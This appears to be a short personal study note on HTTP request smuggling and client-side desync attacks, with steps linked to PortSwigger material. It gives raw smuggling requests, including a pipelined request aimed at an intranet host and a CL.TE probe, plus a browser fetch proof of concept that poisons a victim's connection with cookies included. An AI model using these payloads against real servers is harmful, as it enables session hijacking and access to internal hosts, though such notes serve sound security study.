
#### Desync Attacks
```cpp
TE.CL and CL.TE // classic request smuggling  
H2.CL and H2.TE // HTTP/2 downgrade smuggling  
CL.0 // this  
H2.0 // implied by CL.0  
0.CL and 0.TE // unexploitable without pipelining
```
Server-Side desync require a front-end and back-end architecture | like regular request smuggling.
Client-Side(CSD) desync require front-end only architecture.
CSD:
- send a request has a content-length  without a body, if the server didn't response with an error code, it's likely to be vuln
1.  [Probe for potential desync vectors in Burp.](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync#probing-for-client-side-desync-vectors)
2.  [Confirm the desync vector in Burp.](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync#confirming-the-desync-vector-in-burp)
3.  [Build a proof of concept to replicate the behavior in a browser.](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync#building-a-proof-of-concept-in-a-browser)
4.  Identify an exploitable gadget.
5.  Construct a working [exploit](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync#exploiting-client-side-desync-vulnerabilities) in Burp.
6.  Replicate the [exploit](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync#exploiting-client-side-desync-vulnerabilities) in your browser.
- images endpoints - redirects - files - semi-malformed URLs are likely to be vuln
- Try targeting static files and server-level redirects, and triggering errors via overlong-URLs, and semi-malformed ones like /%2e%2e.
`Content-Length: (longer-than-body)`
-   If the request just hangs or times out, this suggests that the server is waiting for the remaining bytes promised by the headers.
-   If you get an immediate response, you've potentially found a CSD vector. This warrants further investigation.
- client-Side dseync CSD using fetch: _you should see two requests in the Network tab with the same connection ID, and the second one should trigger a 404_
- note the _milicious-prefix_ must not end with trailing newlines `\r\n\r\n`
- desync using pipelining
```HTTP
GET / HTTP/1.1  
Host: redacted  
  
GET / HTTP/1.1  
Host: intranet.redacted
```
- desync Transfer-Encoding chunked body
```HTTP
:method POST
:path /
:authority redacted
X

0

malicious-prefix
```
- Detect Connection-locked CL.TE : causes connection timeout
```HTTP
POST / HTTP/1.1  
Host: example.com  
Content-Length: 41  
Transfer-Encoding: chunked  
  
0
```

```javascript
fetch('https://example.com/', {  
 method: 'POST',  
 body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix  
 mode: 'no-cors', // ensure connection ID is visible  
 credentials: 'include' // poison 'with-cookies' pool  
}).then(() => {  
 location = 'https://example.com/' // use the poisoned connection  
})
```
- novel technique
![[Desync novel technique.png]]